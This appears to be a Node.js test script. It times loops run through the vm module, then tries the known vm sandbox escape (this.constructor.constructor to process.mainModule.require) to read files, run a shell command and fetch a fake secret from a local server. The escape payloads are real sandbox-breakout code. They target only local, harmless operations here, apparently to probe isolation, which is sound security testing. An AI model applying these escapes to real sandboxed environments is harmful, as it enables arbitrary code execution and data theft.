const vm = require('vm'), { performance } = require('perf_hooks'), http = require('http')
const c = vm.createContext({})
const T = code => { const t = performance.now(); const r = vm.runInContext(code, c, { timeout: 20000 }); return [+(performance.now() - t).toFixed(1), r] }
console.log('loop_1e7 in function scope ms:', T('(function(){var s=0;for(var i=0;i<1e7;i++)s+=i;return s})()')[0])
console.log('loop_1e7 global scope ms:', T('var s=0;for(var i=0;i<1e7;i++)s+=i;s')[0])
// permission model + vm qochish + tarmoq
const srv = http.createServer((q, r) => r.end('SECRET-FROM-LOCAL-SERVICE')).listen(0, '127.0.0.1', async () => {
  const port = srv.address().port
  const ctx = vm.createContext({})
  const run = s => { try { return vm.runInContext(s, ctx, { timeout: 2000 }) } catch (e) { return 'BLOCKED: ' + String(e.code || e.message).slice(0, 60) } }
  console.log('escape -> fs read:', run("this.constructor.constructor('return process.mainModule.require(\"fs\").readdirSync(\".\").length')()"))
  console.log('escape -> child_process:', run("this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"echo pwned\").toString()')()"))
  const p = run(`this.constructor.constructor('return fetch("http://127.0.0.1:${port}/").then(r=>r.text())')()`)
  console.log('escape -> network fetch:', p instanceof Promise || (p && p.then) ? await p : p)
  srv.close()
})
